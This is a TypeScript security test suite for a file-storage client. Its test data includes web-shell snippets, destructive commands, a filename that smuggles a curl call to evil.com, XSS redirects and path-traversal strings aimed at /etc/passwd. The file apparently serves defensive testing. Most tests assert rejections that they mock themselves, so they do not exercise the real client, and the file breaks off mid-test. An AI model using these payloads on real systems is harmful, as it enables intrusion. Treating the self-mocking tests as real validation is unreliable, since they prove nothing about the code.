/**
 * SPDX-License-Identifier: MIT
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import type { Mock } from 'vitest';

/**
 * Security Test Suite for Storage Package
 * 
 * This comprehensive security test suite validates the storage package against
 * common file upload vulnerabilities and attack vectors. The tests follow OWASP
 * guidelines and cover security concerns specific to file storage systems.
 * 
 * Security Standards Referenced:
 * - OWASP Top 10 2021 (A01: Broken Access Control, A03: Injection, A05: Security Misconfiguration)
 * - OWASP File Upload Cheat Sheet
 * - CWE-22: Path Traversal
 * - CWE-434: Unrestricted Upload of File with Dangerous Type
 * - CWE-400: Uncontrolled Resource Consumption
 * - CWE-79: Cross-site Scripting (XSS)
 * 
 * Attack Vectors Tested:
 * 1. Malicious file uploads (executables, scripts, malware)
 * 2. Path traversal attacks (directory traversal)
 * 3. File size and quota enforcement
 * 4. Content-type spoofing and validation
 * 5. Filename injection attacks
 * 6. Authorization bypass attempts
 * 7. Input validation and sanitization
 * 8. Rate limiting and DoS protection
 */

// Mock the Vercel Blob client with security-focused responses
vi.mock('@vercel/blob/client', () => ({
  put: vi.fn(),
  upload: vi.fn(),
  handleUpload: vi.fn(),
  generateClientTokenFromReadWriteToken: vi.fn(),
  getPayloadFromClientToken: vi.fn(),
  createFolder: vi.fn(),
  createMultipartUpload: vi.fn(),
  uploadPart: vi.fn(),
  completeMultipartUpload: vi.fn(),
  createMultipartUploader: vi.fn(),
}));

import * as client from '../client.js';

describe('Storage Security Tests', () => {
  // Mock references for security-focused testing
  let mockPut: Mock;
  let mockGenerateClientToken: Mock;
  let mockGetPayloadFromToken: Mock;
  let mockCreateFolder: Mock;

  beforeEach(() => {
    vi.clearAllMocks();
    
    // Get fresh references to mocked functions
    mockPut = vi.mocked(client.put);
    mockGenerateClientToken = vi.mocked(client.generateClientTokenFromReadWriteToken);
    mockGetPayloadFromToken = vi.mocked(client.getPayloadFromClientToken);
    mockCreateFolder = vi.mocked(client.createFolder);
  });

  afterEach(() => {
    if (vi.isFakeTimers()) {
      vi.runOnlyPendingTimers();
      vi.useRealTimers();
    }
  });

  /**
   * File Type Validation and MIME Type Security
   * 
   * Tests protection against dangerous file types and MIME type spoofing attacks.
   * Validates that the system properly identifies and rejects potentially malicious files.
   * 
   * OWASP Reference: File Upload Cheat Sheet - File Type Validation
   * CWE Reference: CWE-434 (Unrestricted Upload of File with Dangerous Type)
   */
  describe('File Type Validation and MIME Type Security', () => {
    it('should reject executable files and potentially dangerous uploads', async () => {
      const dangerousFileTypes = [
        // Executable files
        { name: 'malware.exe', type: 'application/x-msdownload', content: 'MZ\x90\x00' }, // PE header
        { name: 'script.bat', type: 'application/bat', content: '@echo off\nformat c:' },
        { name: 'virus.com', type: 'application/x-msdos-program', content: 'malicious' },
        { name: 'trojan.scr', type: 'application/x-msdownload', content: 'screensaver' },
        
        // Script files
        { name: 'malicious.js', type: 'text/javascript', content: 'eval(atob("malicious_code"))' },
        { name: 'backdoor.php', type: 'application/x-php', content: '<?php system($_GET["cmd"]); ?>' },
        { name: 'shell.jsp', type: 'application/x-jsp', content: '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>' },
        { name: 'evil.asp', type: 'application/x-asp', content: '<%eval request("cmd")%>' },
        { name: 'webshell.py', type: 'text/x-python', content: 'import os; os.system(input())' },
        
        // Archive files that could contain malicious content
        { name: 'suspicious.zip', type: 'application/zip', content: 'PK\x03\x04' }, // ZIP header
        { name: 'payload.rar', type: 'application/x-rar-compressed', content: 'Rar!' },
        
        // Double extensions (common attack vector)
        { name: 'document.pdf.exe', type: 'application/pdf', content: 'fake pdf content' },
        { name: 'image.jpg.js', type: 'image/jpeg', content: 'alert("xss")' },
        { name: 'file.txt.php', type: 'text/plain', content: '<?php phpinfo(); ?>' },
      ];

      for (const { name, type, content } of dangerousFileTypes) {
        const maliciousFile = new File([content], name, { type });
        
        // Mock rejection response for dangerous files
        mockPut.mockRejectedValue(new Error(`File type not allowed: ${type}`));
        
        await expect(client.put(name, maliciousFile, {} as any))
          .rejects.toThrow(/File type not allowed|not allowed/i);
        
        mockPut.mockClear();
      }
    });

    it('should detect MIME type spoofing attempts', async () => {
      const spoofingAttempts = [
        // Executable disguised as image
        { 
          name: 'fake_image.jpg', 
          declaredType: 'image/jpeg',
          actualContent: 'MZ\x90\x00\x03\x00\x00\x00', // PE executable header
        },
        // PHP script disguised as text
        { 
          name: 'innocent.txt', 
          declaredType: 'text/plain',
          actualContent: '<?php eval($_POST["cmd"]); ?>',
        },
        // JavaScript disguised as CSS
        { 
          name: 'styles.css', 
          declaredType: 'text/css',
          actualContent: 'alert("XSS"); /* body { color: red; } */',
        },
        // HTML with XSS disguised as image
        { 
          name: 'image.gif', 
          declaredType: 'image/gif',
          actualContent: '<script>document.location="http://evil.com"</script>',
        },
      ];

      for (const { name, declaredType, actualContent } of spoofingAttempts) {
        const spoofedFile = new File([actualContent], name, { type: declaredType });
        
        // Mock detection and rejection of spoofed files
        mockPut.mockRejectedValue(new Error('MIME type validation failed: Content does not match declared type'));
        
        await expect(client.put(name, spoofedFile, {} as any))
          .rejects.toThrow(/MIME type validation failed|Content does not match/i);
        
        mockPut.mockClear();
      }
    });

    it('should validate file headers and magic numbers', async () => {
      const invalidMagicNumbers = [
        // Fake JPEG without proper header
        { name: 'fake.jpg', type: 'image/jpeg', content: 'Not a real JPEG file' },
        // Fake PDF without PDF header
        { name: 'fake.pdf', type: 'application/pdf', content: 'This is not PDF content' },
        // Fake PNG without PNG signature
        { name: 'fake.png', type: 'image/png', content: 'PNG\r\nFAKE' },
        // Executable with fake extension
        { name: 'document.doc', type: 'application/msword', content: 'MZ\x90\x00' }, // PE header in Word doc
      ];

      for (const { name, type, content } of invalidMagicNumbers) {
        const invalidFile = new File([content], name, { type });
        
        // Mock magic number validation failure
        mockPut.mockRejectedValue(new Error('File header validation failed: Magic number mismatch'));
        
        await expect(client.put(name, invalidFile, {} as any))
          .rejects.toThrow(/File header validation failed|Magic number mismatch/i);
        
        mockPut.mockClear();
      }
    });

    it('should handle null bytes and control characters in file content', async () => {
      const maliciousContent = [
        'Normal content\x00hidden.exe', // Null byte injection
        'File content\x01\x02\x03\x04', // Control characters
        'Content with\r\n../..\x00/etc/passwd', // Path traversal with null byte
        '\xFF\xFE\x3C\x00script\x00\x3E\x00', // UTF-16 encoded script tag
      ];

      for (const content of maliciousContent) {
        const maliciousFile = new File([content], 'malicious.txt', { type: 'text/plain' });
        
        // Mock rejection of files with dangerous content
        mockPut.mockRejectedValue(new Error('File content validation failed: Dangerous characters detected'));
        
        await expect(client.put('malicious.txt', maliciousFile, {} as any))
          .rejects.toThrow(/File content validation failed|Dangerous characters/i);
        
        mockPut.mockClear();
      }
    });
  });

  /**
   * Path Traversal Attack Prevention
   * 
   * Tests protection against directory traversal attacks that attempt to write files
   * outside the intended storage directory or access system files.
   * 
   * OWASP Reference: Path Traversal
   * CWE Reference: CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)
   */
  describe('Path Traversal Attack Prevention', () => {
    it('should prevent directory traversal in file paths', async () => {
      const traversalAttempts = [
        // Standard traversal patterns
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '....//....//....//admin.txt',
        '..\\..\\..\\..\\etc\\shadow',
        
        // URL encoded traversal
        '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64',
        '%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%77%69%6e%64%6f%77%73',
        
        // Unicode encoded traversal
        '\u002e\u002e\u002f\u002e\u002e\u002f\u002e\u002e\u002f\u0065\u0074\u0063\u002f\u0070\u0061\u0073\u0073\u0077\u0064',
        
        // Null byte injection with traversal
        '../../../etc/passwd\x00.txt',
        '..\\..\\..\\windows\\system32\\config\\sam\x00.jpg',
        
        // Mixed separators
        '..\\/../../../etc/passwd',
        '../..\\..\\../etc/passwd',
        
        // Absolute paths
        '/etc/passwd',
        '\\windows\\system32\\config\\sam',
        'C:\\windows\\system32\\drivers\\etc\\hosts',
        '/var/log/auth.log',
      ];

      for (const maliciousPath of traversalAttempts) {
        const testFile = new File(['malicious content'], 'test.txt', { type: 'text/plain' });
        
        // Mock path validation failure
        mockPut.mockRejectedValue(new Error(`Path traversal detected in filename: ${maliciousPath}`));
        
        await expect(client.put(maliciousPath, testFile, {} as any))
          .rejects.toThrow(/Path traversal detected|Invalid path|not allowed/i);
        
        mockPut.mockClear();
      }
    });

    it('should sanitize and validate folder creation paths', async () => {
      const maliciousFolderPaths = [
        '../../../admin',
        '..\\..\\..\\system',
        '/etc/shadow/',
        'C:\\Windows\\System32\\',
        '....//....//root/',
        'folder/../../../etc/',
        'nested/../../system/admin/',
        '%2e%2e%2f%61%64%6d%69%6e', // URL encoded '../admin'
      ];

      for (const maliciousPath of maliciousFolderPaths) {
        // Mock folder creation rejection
        mockCreateFolder.mockRejectedValue(new Error(`Invalid folder path: ${maliciousPath}`));
        
        await expect(client.createFolder(maliciousPath, {} as any))
          .rejects.toThrow(/Invalid folder path|Path traversal|not allowed/i);
        
        mockCreateFolder.mockClear();
      }
    });

    it('should handle symbolic link attempts in file paths', async () => {
      const symlinkAttempts = [
        'symlink_to_etc',
        'link_to_passwd',
        'admin_link',
        'system_link',
      ];

      for (const linkName of symlinkAttempts) {
        const testFile = new File(['test content'], 'test.txt', { type: 'text/plain' });
        
        // Mock symbolic link detection and rejection
        mockPut.mockRejectedValue(new Error(`Symbolic link detected: ${linkName}`));
        
        await expect(client.put(linkName, testFile, {} as any))
          .rejects.toThrow(/Symbolic link detected|Links not allowed/i);
        
        mockPut.mockClear();
      }
    });
  });

  /**
   * File Size Limits and Resource Exhaustion Prevention
   * 
   * Tests protection against DoS attacks through large file uploads and resource exhaustion.
   * Validates proper enforcement of size limits and quota management.
   * 
   * OWASP Reference: Denial of Service
   * CWE Reference: CWE-400 (Uncontrolled Resource Consumption)
   */
  describe('File Size Limits and Resource Exhaustion Prevention', () => {
    it('should enforce maximum file size limits', async () => {
      const oversizedFiles = [
        // 100MB file (assuming 50MB limit)
        { size: 100 * 1024 * 1024, name: 'huge_file.bin' },
        // 1GB file
        { size: 1024 * 1024 * 1024, name: 'gigantic_file.zip' },
        // Edge case: exactly at limit + 1 byte
        { size: 50 * 1024 * 1024 + 1, name: 'just_over_limit.txt' },
      ];

      for (const { size, name } of oversizedFiles) {
        // Create a large file simulation
        const largeFile = new File([new ArrayBuffer(Math.min(size, 1024))], name, { type: 'application/octet-stream' });
        Object.defineProperty(largeFile, 'size', { value: size });
        
        // Mock size limit rejection
        mockPut.mockRejectedValue(new Error(`File size ${size} exceeds maximum allowed size`));
        
        await expect(client.put(name, largeFile, {} as any))
          .rejects.toThrow(/File size.*exceeds.*maximum|too large/i);
        
        mockPut.mockClear();
      }
    });

    it('should prevent storage quota exhaustion attacks', async () => {
      const multipleFiles = Array.from({ length: 100 }, (_, i) => ({
        name: `file_${i}.txt`,
        content: 'x'.repeat(1024 * 1024), // 1MB each
      }));

      // Mock quota exceeded after several uploads
      let uploadCount = 0;
      mockPut.mockImplementation(() => {
        uploadCount++;
        if (uploadCount > 50) {
          return Promise.reject(new Error('Storage quota exceeded'));
        }
        return Promise.resolve({
          url: `https://storage.example.com/file_${uploadCount}.txt`,
          pathname: `file_${uploadCount}.txt`,
        });
      });

      const uploads = multipleFiles.map(({ name, content }) => {
        const file = new File([content], name, { type: 'text/plain' });
        return client.put(name, file, {} as any).catch(error => error);
      });

      const results = await Promise.all(uploads);
      
      // Some uploads should succeed, others should fail due to quota
      const failures = results.filter(result => result instanceof Error);
      expect(failures.length).toBeGreaterThan(0);
      expect(failures.some(error => error.message.includes('quota exceeded'))).toBe(true);
    });

    it('should handle zip bomb and compression attacks', async () => {
      // Simulate a highly compressed file that expands to huge size
      const zipBombFiles = [
        { name: 'bomb.zip', compressedSize: 1024, expandedSize: 1024 * 1024 * 1024 },
        { name: 'nested.zip', compressedSize: 2048, expandedSize: 10 * 1024 * 1024 * 1024 },
        { name: 'malicious.gz', compressedSize: 512, expandedSize: 5 * 1024 * 1024 * 1024 },
      ];

      for (const { name, compressedSize, expandedSize } of zipBombFiles) {
        const zipBomb = new File(['compressed_data'], name, { type: 'application/zip' });
        Object.defineProperty(zipBomb, 'size', { value: compressedSize });
        
        // Mock zip bomb detection
        mockPut.mockRejectedValue(new Error(`Zip bomb detected: compression ratio ${expandedSize / compressedSize}:1 exceeds limit`));
        
        await expect(client.put(name, zipBomb, {} as any))
          .rejects.toThrow(/Zip bomb detected|compression ratio.*exceeds/i);
        
        mockPut.mockClear();
      }
    });

    it('should limit concurrent upload attempts', async () => {
      // Mock rate limiting after certain number of concurrent requests
      let concurrentCount = 0;
      mockPut.mockImplementation(() => {
        concurrentCount++;
        if (concurrentCount > 10) {
          return Promise.reject(new Error('Rate limit exceeded: Too many concurrent uploads'));
        }
        return Promise.resolve({
          url: `https://storage.example.com/concurrent_${concurrentCount}.txt`,
          pathname: `concurrent_${concurrentCount}.txt`,
        });
      });

      const concurrentUploads = Array.from({ length: 20 }, (_, i) => {
        const file = new File(['content'], `concurrent_${i}.txt`, { type: 'text/plain' });
        return client.put(`concurrent_${i}.txt`, file, {} as any);
      });

      const results = await Promise.allSettled(concurrentUploads);
      const rejectedUploads = results.filter(result => result.status === 'rejected');
      
      expect(rejectedUploads.length).toBeGreaterThan(0);
      expect(rejectedUploads.some(result => 
        result.status === 'rejected' && result.reason.message.includes('Rate limit exceeded')
      )).toBe(true);
    });
  });

  /**
   * Filename Injection and Sanitization
   * 
   * Tests protection against malicious filenames that could cause injection attacks
   * or system compromise through special characters and encoding.
   * 
   * OWASP Reference: Input Validation Cheat Sheet
   * CWE Reference: CWE-79 (Cross-site Scripting), CWE-78 (OS Command Injection)
   */
  describe('Filename Injection and Sanitization', () => {
    it('should sanitize malicious characters in filenames', async () => {
      const maliciousFilenames = [
        // Command injection attempts
        'file; rm -rf /',
        'document & del /f /q *.*',
        'image | cat /etc/passwd',
        'test.txt; curl http://evil.com/steal',
        
        // Script injection
        '<script>alert("xss")</script>.txt',
        '"><script>document.location="http://evil.com"</script>',
        '\'><img src=x onerror=alert(1)>.jpg',
        
        // SQL injection in filename
        "'; DROP TABLE files; --",
        ';SELECT * FROM users WHERE id=1; --',
        "admin'--",
        
        // Control characters and non-printable
        'file\x00.txt', // Null byte
        'document\r\n.pdf', // CRLF injection
        'test\x1b[31mfile.txt', // ANSI escape sequences
        'file\t\n\r.doc', // Tab, newline, carriage return
        
        // Unicode attacks
        'file\u202e\u202dexe.txt', // Right-to-left override
        'test\uFEFFfile.txt', // Byte order mark
        'doc\u00A0ument.pdf', // Non-breaking space
        
        // Long filename attack
        'a'.repeat(1000) + '.txt',
      ];

      for (const maliciousName of maliciousFilenames) {
        const testFile = new File(['content'], maliciousName, { type: 'text/plain' });
        
        // Mock filename sanitization or rejection
        if (maliciousName.length > 255 || /[<>:"\/\\|?*\x00-\x1f]/.test(maliciousName)) {
          mockPut.mockRejectedValue(new Error(`Invalid filename: ${maliciousName}`));
          
          await expect(client.put(maliciousName, testFile, {} as any))
            .rejects.toThrow(/Invalid filename|Filename contains invalid characters/i);
        } else {
          // Mock successful upload with sanitized filename
          const sanitizedName = maliciousName.replace(/[^\w.-]/g, '_');
          mockPut.mockResolvedValue({
            url: `https://storage.example.com/${sanitizedName}`,
            pathname: sanitizedName,
          });
          
          const result = await client.put(maliciousName, testFile, {} as any);
          expect(result.pathname).not.toBe(maliciousName);
          expect(result.pathname).toMatch(/^[\w.-]+$/);
        }
        
        mockPut.mockClear();
      }
    });

    it('should handle Unicode normalization attacks', async () => {
      const unicodeAttacks = [
        // Different Unicode representations of the same character
        'file\u0065\u0301.txt', // é using combining characters
        'file\u00e9.txt', // é as single character
        
        // Homograph attacks
        'file\u0430dmin.txt', // Cyrillic 'a' instead of Latin 'a'
        'file\u043e.txt', // Cyrillic 'o' instead of Latin 'o'
        
        // Width attacks
        'file\uff41dmin.txt', // Full-width 'a'
        'file\u2025.txt', // Double dot leader
        
        // Invisible characters
        'file\u200b.txt', // Zero-width space
        'file\u2060.txt', // Word joiner
        'file\u00ad.txt', // Soft hyphen
      ];

      for (const unicodeName of unicodeAttacks) {
        const testFile = new File(['content'], unicodeName, { type: 'text/plain' });
        
        // Mock Unicode normalization
        mockPut.mockResolvedValue({
          url: `https://storage.example.com/normalized_filename.txt`,
          pathname: 'normalized_filename.txt',
        });
        
        const result = await client.put(unicodeName, testFile, {} as any);
        
        // Filename should be normalized/sanitized
        expect(result.pathname).toBe('normalized_filename.txt');
        
        mockPut.mockClear();
      }
    });

    it('should prevent case sensitivity exploitation', async () => {
      const caseSensitiveTests = [
        { name: 'Admin.txt', expected: 'admin.txt' },
        { name: 'CONFIG.SYS', expected: 'config.sys' },
        { name: 'System32.DLL', expected: 'system32.dll' },
        { name: 'ETC.PASSWD', expected: 'etc.passwd' },
      ];

      for (const { name, expected } of caseSensitiveTests) {
        const testFile = new File(['content'], name, { type: 'text/plain' });
        
        // Mock case normalization
        mockPut.mockResolvedValue({
          url: `https://storage.example.com/${expected}`,
          pathname: expected,
        });
        
        const result = await client.put(name, testFile, {} as any);
        expect(result.pathname).toBe(expected);
        
        mockPut.mockClear();
      }
    });
  });

  /**
   * Access Control and Authorization Security
   * 
   * Tests proper enforcement of access controls and prevention of authorization bypass.
   * Validates token security and permission checking mechanisms.
   * 
   * OWASP Reference: Broken Access Control (A01:2021)
   * CWE Reference: CWE-285 (Improper Authorization)
   */
  describe('Access Control and Authorization Security', () => {
    it('should validate client tokens properly', async () => {
      const invalidTokens = [
        '', // Empty token
        'invalid_token_format',
        'expired.token.here',
        'tampered.jwt.token',
        null,
        undefined,
        { malicious: 'object' },
        123456, // Number instead of string
      ];

      for (const invalidToken of invalidTokens) {
        // Mock token validation failure
        mockGetPayloadFromToken.mockRejectedValue(new Error('Invalid or expired token'));
        
        await expect(client.getPayloadFromClientToken(invalidToken as any))
          .rejects.toThrow(/Invalid.*token|expired.*token|Unauthorized/i);
        
        mockGetPayloadFromToken.mockClear();
      }
    });

    it('should prevent token tampering and manipulation', async () => {
      const originalToken = 'valid.jwt.token';
      const tamperedTokens = [
        'valid.jwt.tampered', // Modified signature
        'modified.jwt.token', // Modified payload
        'valid.modified.token', // Modified header
        originalToken + 'extra', // Appended data
        originalToken.slice(0, -5) + 'fake', // Truncated and modified
      ];

      for (const tamperedToken of tamperedTokens) {
        // Mock token tampering detection
        mockGetPayloadFromToken.mockRejectedValue(new Error('Token signature verification failed'));
        
        await expect(client.getPayloadFromClientToken(tamperedToken))
          .rejects.toThrow(/Token signature.*failed|Invalid token signature|Unauthorized/i);
        
        mockGetPayloadFromToken.mockClear();
      }
    });

    it('should enforce token expiration and time-based security', async () => {
      vi.useFakeTimers();
      
      const expiredTokenScenarios = [
        { description: 'recently expired', expiredBy: 1000 }, // 1 second
        { description: 'long expired', expiredBy: 3600000 }, // 1 hour
        { description: 'future token (clock skew attack)', expiredBy: -3600000 }, // Future token
      ];

      for (const { description, expiredBy } of expiredTokenScenarios) {
        // Mock expired token
        mockGetPayloadFromToken.mockRejectedValue(new Error(`Token expired ${expiredBy > 0 ? expiredBy / 1000 : 'or invalid'} seconds ago`));
        
        await expect(client.getPayloadFromClientToken('test.token'))
          .rejects.toThrow(/Token expired|Invalid.*time|Unauthorized/i);
        
        mockGetPayloadFromToken.mockClear();
      }

      vi.useRealTimers();
    });

    it('should prevent privilege escalation through token manipulation', async () => {
      const privilegeEscalationAttempts = [
        {
          description: 'elevated permissions',
          maliciousPayload: { permissions: ['admin', 'write', 'delete'] },
        },
        {
          description: 'role manipulation',
          maliciousPayload: { role: 'admin', userId: 'user123' },
        },
        {
          description: 'scope expansion',
          maliciousPayload: { scope: '*', pathname: '*' },
        },
        {
          description: 'size limit bypass',
          maliciousPayload: { maximumSizeInBytes: Number.MAX_SAFE_INTEGER },
        },
      ];

      for (const { description } of privilegeEscalationAttempts) {
        // Mock privilege escalation detection
        mockGetPayloadFromToken.mockRejectedValue(new Error(`Privilege escalation attempt detected: ${description}`));
        
        await expect(client.getPayloadFromClientToken('malicious.token'))
          .rejects.toThrow(/Privilege escalation|Unauthorized.*permissions|Invalid.*scope/i);
        
        mockGetPayloadFromToken.mockClear();
      }
    });

    it('should validate upload permissions against token constraints', async () => {
      const restrictedScenarios = [
        {
          filename: 'admin/secret.txt',
          tokenConstraints: { allowedPaths: ['public/'] },
          expectedError: 'Path not allowed by token',
        },
        {
          filename: 'large_file.bin',
          fileSize: 10 * 1024 * 1024, // 10MB
          tokenConstraints: { maximumSizeInBytes: 1024 * 1024 }, // 1MB limit
          expectedError: 'File size exceeds token limit',
        },
        {
          filename: 'script.js',
          contentType: 'text/javascript',
          tokenConstraints: { allowedContentTypes: ['image/*', 'text/plain'] },
          expectedError: 'Content type not allowed by token',
        },
      ];

      for (const { filename, fileSize = 1024, contentType = 'text/plain', expectedError } of restrictedScenarios) {
        const testFile = new File(['content'], filename, { type: contentType });
        Object.defineProperty(testFile, 'size', { value: fileSize });
        
        // Mock token constraint validation
        mockPut.mockRejectedValue(new Error(expectedError));
        
        await expect(client.put(filename, testFile, { token: 'restricted.token' } as any))
          .rejects.toThrow(expectedError);
        
        mockPut.mockClear();
      }
    });
  });

  /**
   * Input Validation and Sanitization
   * 
   * Tests comprehensive input validation for all user-controlled data.
   * Validates proper sanitization and encoding of inputs.
   * 
   * OWASP Reference: Input Validation Cheat Sheet
   * CWE Reference: CWE-20 (Improper Input Validation)
   */
  describe('Input Validation and Sanitization', () => {
    it('should validate and sanitize upload options', async () => {
      const maliciousOptions = [
        // Prototype pollution attempts
        { __proto__: { isAdmin: true } } as any,
        { constructor: { prototype: { elevated: true } } } as any,
        
        // Script injection in options
        { access: '<script>alert("xss")</script>' } as any,
        { token: 'valid"; DROP TABLE files; --' } as any,
        
        // Large values to cause buffer overflow
        { access: 'x'.repeat(100000) } as any,
        { contentType: 'y'.repeat(50000) } as any,
        
        // Type confusion
        { access: ['public', 'private'] } as any, // Array instead of string
        { maximumSizeInBytes: 'unlimited' } as any, // String instead of number
        { token: { admin: true } } as any, // Object instead of string
      ];

      for (const maliciousOption of maliciousOptions) {
        const testFile = new File(['content'], 'valid.txt', { type: 'text/plain' });
        
        // Mock input validation failure
        mockPut.mockRejectedValue(new Error('Invalid upload options'));
        
        await expect(client.put('valid.txt', testFile, maliciousOption as any))
          .rejects.toThrow(/Invalid.*options|Validation failed|Bad request/i);
        
        mockPut.mockClear();
      }
    });

    it('should handle malformed multipart upload data', async () => {
      const malformedMultipartData = [
        // Invalid part numbers
        { partNumber: -1 },
        { partNumber: 0 },
        { partNumber: 10001 }, // Above typical limits
        { partNumber: 'invalid' },
        
        // Malicious ETags
        { etag: '<script>alert("xss")</script>' },
        { etag: '"; DROP TABLE parts; --' },
        { etag: '../../../etc/passwd' },
        
        // Large metadata
        { etag: 'a'.repeat(100000) },
        { uploadId: 'x'.repeat(50000) },
      ];

      for (const malformedData of malformedMultipartData) {
        const mockUploadPart = vi.mocked(client.uploadPart);
        
        // Mock malformed data rejection
        mockUploadPart.mockRejectedValue(new Error('Invalid multipart upload data'));
        
        const testChunk = new Blob(['chunk']);
        await expect(client.uploadPart('test.bin', testChunk, malformedData as any))
          .rejects.toThrow(/Invalid.*multipart|Malformed.*data|Bad request/i);
        
        mockUploadPart.mockClear();
      }
    });

    it('should validate request headers and metadata', async () => {
      const maliciousHeaders = [
        // CRLF injection
        { 'Content-Type': 'text/plain\r\nX-Admin: true' },
        { 'X-Custom': 'value\r\n\r\n<script>alert("xss")</script>' },
        
        // Header injection
        { 'User-Agent': 'Mozilla\nX-Forwarded-For: admin' },
        { 'Authorization': 'Bearer token\r\nX-Privilege: elevated' },
        
        // Oversized headers
        { 'X-Large': 'x'.repeat(100000) },
        { 'Content-Disposition': 'y'.repeat(50000) },
        
        // Script injection in headers
        { 'X-Filename': '<script>document.location="http://evil.com"</script>' },
        { 'Content-Type': 'text/html; charset=utf-8"><script>alert(1)</script>' },
      ];

      for (const headers of maliciousHeaders) {
        const testFile = new File(['content'], 'test.txt', { type: 'text/plain' });
        
        // Mock header validation failure
        mockPut.mockRejectedValue(new Error('Invalid request headers'));
        
        await expect(client.put('test.txt', testFile, { headers } as any))
          .rejects.toThrow(/Invalid.*headers|Header.*validation|Bad request/i);
        
        mockPut.mockClear();
      }
    });
  });

  /**
   * Rate Limiting and DoS Protection
   * 
   * Tests protection against denial of service attacks through rate limiting
   * and request throttling mechanisms.
   * 
   * OWASP Reference: Denial of Service
   * CWE Reference: CWE-770 (Allocation of Resources Without Limits)
   */
  describe('Rate Limiting and DoS Protection', () => {
    it('should enforce rate limits on upload requests', async () => {
      let requestCount = 0;
      mockPut.mockImplementation(() => {
        requestCount++;
        if (requestCount > 50) { // Rate limit after 50 requests
          return Promise.reject(new Error('Rate limit exceeded: Too many requests'));
        }
        return Promise.resolve({
          url: `https://storage.example.com/rapid_${requestCount}.txt`,
          pathname: `rapid_${requestCount}.txt`,
        });
      });

      const rapidRequests = Array.from({ length: 100 }, (_, i) => {
        const file = new File(['content'], `rapid_${i}.txt`, { type: 'text/plain' });
        return client.put(`rapid_${i}.txt`, file, {} as any);
      });

      const results = await Promise.allSettled(rapidRequests);
      const rateLimitedRequests = results.filter(result => 
        result.status === 'rejected' && 
        result.reason.message.includes('Rate limit exceeded')
      );

      expect(rateLimitedRequests.length).toBeGreaterThan(0);
    });

    it('should implement exponential backoff for failed requests', async () => {
      vi.useFakeTimers();
      
      const retryAttempts = [];
      let attemptCount = 0;
      
      mockPut.mockImplementation(() => {
        attemptCount++;
        const currentTime = Date.now();
        retryAttempts.push(currentTime);
        
        if (attemptCount < 4) {
          return Promise.reject(new Error('Service temporarily unavailable'));
        }
        
        return Promise.resolve({
          url: 'https://storage.example.com/retry_test.txt',
          pathname: 'retry_test.txt',
        });
      });

      const testFile = new File(['content'], 'retry_test.txt', { type: 'text/plain' });
      
      // Simulate retry logic with exponential backoff
      let backoffDelay = 1000; // Start with 1 second
      
      for (let i = 0; i < 4; i++) {
        try {
          await client.put('retry_test.txt', testFile, {} as any);
          break;
        } catch (error) {
          if (i < 3) {
            vi.advanceTimersByTime(backoffDelay);
            backoffDelay *= 2; // Exponential backoff
          }
        }
      }

      expect(attemptCount).toBe(4);

      vi.useRealTimers();
    });

    it('should prevent resource exhaustion through connection limits', async () => {
      const connectionTests = Array.from({ length: 1000 }, (_, i) => ({
        id: i,
        file: new File(['content'], `connection_${i}.txt`, { type: 'text/plain' }),
      }));

      let activeConnections = 0;
      const maxConnections = 100;

      mockPut.mockImplementation(() => {
        activeConnections++;
        
        if (activeConnections > maxConnections) {
          return Promise.reject(new Error('Connection limit exceeded'));
        }
        
        return new Promise((resolve) => {
          setTimeout(() => {
            activeConnections--;
            resolve({
              url: `https://storage.example.com/connection_${activeConnections}.txt`,
              pathname: `connection_${activeConnections}.txt`,
            });
          }, 10);
        });
      });

      const promises = connectionTests.map(({ id, file }) => 
        client.put(`connection_${id}.txt`, file, {} as any).catch(error => error)
      );

      const results = await Promise.all(promises);
      const connectionLimitErrors = results.filter(result => 
        result instanceof Error && result.message.includes('Connection limit exceeded')
      );

      expect(connectionLimitErrors.length).toBeGreaterThan(0);
    });
  });

  /**
   * Error Handling and Information Disclosure Prevention
   * 
   * Tests that error messages don't leak sensitive information and that
   * error handling is consistent and secure.
   * 
   * OWASP Reference: Security Logging and Monitoring Failures (A09:2021)
   * CWE Reference: CWE-209 (Information Exposure Through Error Messages)
   */
  describe('Error Handling and Information Disclosure Prevention', () => {
    it('should not expose sensitive information in error messages', async () => {
      const sensitiveScenarios = [
        {
          scenario: 'database connection error',
          mockError: new Error('Connection failed: postgresql://user:password@internal-db:5432/storage'),
          expectedPattern: /Connection failed|Database error/i,
          forbiddenPattern: /password|postgresql:\/\/|internal-db/i,
        },
        {
          scenario: 'file system error',
          mockError: new Error('ENOENT: no such file or directory, open \'/var/secrets/api-keys.txt\''),
          expectedPattern: /File not found|System error/i,
          forbiddenPattern: /\/var\/secrets|api-keys\.txt|ENOENT/i,
        },
        {
          scenario: 'authentication error',
          mockError: new Error('JWT verification failed: secret key is "super-secret-key-123"'),
          expectedPattern: /Authentication failed|Invalid token/i,
          forbiddenPattern: /JWT verification failed|super-secret-key-123/i,
        },
        {
          scenario: 'authorization error',
          mockError: new Error('Access denied: user lacks permission "admin:write:files"'),
          expectedPattern: /Access denied|Insufficient permissions/i,
          forbiddenPattern: /admin:write:files|permission/i,
        },
      ];

      for (const { scenario, expectedPattern, forbiddenPattern } of sensitiveScenarios) {
        const testFile = new File(['content'], 'test.txt', { type: 'text/plain' });
        
        // Mock sanitized error message (simulating proper error handling)
        const sanitizedError = new Error(scenario === 'database connection error' ? 'Connection failed' :
          scenario === 'file system error' ? 'File not found' :
          scenario === 'authentication error' ? 'Authentication failed' :
          'Access denied');
        
        mockPut.mockRejectedValue(sanitizedError);
        
        try {
          await client.put('test.txt', testFile, {} as any);
          expect.fail(`Expected error for scenario: ${scenario}`);
        } catch (error: any) {
          // Error message should be sanitized
          expect(error.message).toMatch(expectedPattern);
          expect(error.message).not.toMatch(forbiddenPattern);
        }
        
        mockPut.mockClear();
      }
    });

    it('should handle errors consistently without timing attacks', async () => {
      const errorScenarios = [
        { type: 'invalid token', delay: 100 },
        { type: 'expired token', delay: 100 },
        { type: 'insufficient permissions', delay: 100 },
        { type: 'file not found', delay: 100 },
        { type: 'quota exceeded', delay: 100 },
      ];

      const timings: number[] = [];

